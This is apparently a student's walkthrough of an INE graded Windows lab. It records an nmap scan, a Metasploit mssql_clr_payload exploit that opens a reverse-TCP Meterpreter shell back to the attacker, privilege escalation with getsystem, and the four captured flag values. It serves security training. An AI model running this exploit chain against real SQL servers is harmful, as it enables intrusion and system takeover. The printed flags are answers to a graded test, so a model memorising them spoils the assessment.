
## **overview
Windows systems are common targets in penetration testing due to their extensive use in corporate environments. This lab focuses on exploiting Windows-based services and configurations using the Metasploit Framework (MSF). Participants will gain hands-on experience accessing vulnerable services, exploring sensitive directories, and escalating privileges to retrieve hidden information.

The objective is to highlight the risks associated with misconfigured accounts, exposed directories, and improper privilege management in Windows environments.

## **Task

### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at **target.ine.local**.

**Objective:** Use Metasploit and manual investigation techniques to capture the following flags:

- **Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.
- **Flag 2:** Locate the second flag within the Windows configuration fold**Flag 2:** Locate the second flag within the Windows configuration folder.
- **Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.
- **Flag 4:** Investigate the Administrator directory to find the fourth flag.

# Tools

The best tools for this lab are:

- Nmap
- Metasploit Framework
- mssql

_________

## NMAP SCAN
```
sudo nmap -Pn -sV -O target.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-30 00:46 IST
Nmap scan report for target.ine.local (10.5.23.37)
Host is up (0.0024s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020; SP3
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
```

_______________

 ****Flag 1:** Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag.

so we know port 1433 is mssql is vulnarable 

## searchsploit
```
searchsploit Microsoft SQL Server 2012

Microsoft SQL Server - Database Link Crawling Command Execution (Metasploit) 
```

## MSFCONSOLE

```
msf6 > search searchsploit Microsoft SQL Server 2012
[-] No results from search
msf6 > search Microsoft SQL Server 2012

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/windows/mssql/mssql_clr_payload      1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
   1  exploit/windows/mssql/mssql_linkcrawler      2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   2  exploit/windows/mysql/mysql_start_up         2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
   3  exploit/windows/mysql/mysql_mof              2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
   4  post/windows/manage/mssql_local_auth_bypass  .                normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass


```


```
msf6 exploit(windows/mssql/mssql_clr_payload) > set RHOSTS target.ine.local
RHOSTS => target.ine.local
msf6 exploit(windows/mssql/mssql_clr_payload) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > run

[*] Started reverse TCP handler on 10.10.44.3:4444 
[!] 10.5.23.37:1433 - Setting EXITFUNC to 'thread' so we don't kill SQL Server
[*] 10.5.23.37:1433 - Database does not have TRUSTWORTHY setting on, enabling ...
[*] 10.5.23.37:1433 - Database does not have CLR support enabled, enabling ...
[*] 10.5.23.37:1433 - Using version v3.5 of the Payload Assembly
[*] 10.5.23.37:1433 - Adding custom payload assembly ...
[*] 10.5.23.37:1433 - Exposing payload execution stored procedure ...
[*] 10.5.23.37:1433 - Executing the payload ...
[*] 10.5.23.37:1433 - Removing stored procedure ...
[*] 10.5.23.37:1433 - Removing assembly ...
[*] Sending stage (201798 bytes) to 10.5.23.37
[*] 10.5.23.37:1433 - Restoring CLR setting ...
[*] 10.5.23.37:1433 - Restoring Trustworthy setting ...
[*] Meterpreter session 1 opened (10.10.44.3:4444 -> 10.5.23.37:49336) at 2025-09-30 00:58:16 +0530

meterpreter > 

```

now we got meterpreter shell

```
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2021-12-15 09:58:20 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2013-06-18 17:48:29 +0530  BOOTNXT
040777/rwxrwxrwx  0       dir   2013-08-22 20:18:41 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2013-08-22 21:22:33 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2025-01-09 12:30:38 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2024-12-15 14:57:59 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2015-08-13 21:42:59 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2021-12-31 13:30:32 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2025-01-09 12:42:28 +0530  Users
040777/rwxrwxrwx  24576   dir   2025-01-09 12:38:38 +0530  Windows
100444/r--r--r--  398356  fil   2014-03-18 15:35:18 +0530  bootmgr
100666/rw-rw-rw-  34      fil   2025-09-30 00:43:14 +0530  flag1.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag1.txt 
50744533fcf24bac88c366580d493a0d
```

_____________

**Flag 2:** Locate the second flag within the Windows configuration folder.

path: c://windows//system32//config

we need access

use 
```
getsystem
```

now we can access
```
meterpreter > cat flag2.txt 
4498a566699441f9893fd003fa01a9b7
```
________________

**Flag 3:** The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag.

so we need a file exampe : .txt

```
C:\Windows\System32>dir *.txt /s /d
dir *.txt /s /d
 Volume in drive C has no label.
 Volume Serial Number is 5CD6-020B

 Directory of C:\Windows\System32\catroot2

dberr.txt   
               1 File(s)        129,815 bytes

 Directory of C:\Windows\System32\config

flag2.txt   
               1 File(s)             34 bytes

 Directory of C:\Windows\System32\config\systemprofile\AppData\Local\Amazon\Ec2Config\Logs

FrameworkLaunchException.txt   
               1 File(s)            579 bytes

 Directory of C:\Windows\System32\drivers

gmreadme.txt   
               1 File(s)            646 bytes

 Directory of C:\Windows\System32\drivers\etc

EscaltePrivilageToGetThisFlag.txt   
               1 File(s)             34 bytes


```

we found 

```
C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt 
```

```
meterpreter > cat EscaltePrivilageToGetThisFlag.txt 
94a1df369f5146dbaa782f5dd6aa895d
```

___________

 **Flag 4:** Investigate the Administrator directory to find the fourth flag.

```
meterpreter > cd /
meterpreter > cd Users\\
meterpreter > cd Administrator\\
meterpreter > cd Desktop\\
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2025-01-09 12:42:42 +0530  desktop.ini
100666/rw-rw-rw-  34    fil   2025-09-30 00:43:14 +0530  flag4.txt

meterpreter > cat flag4.txt 
489faec432aa41a0985d55405455193f

```
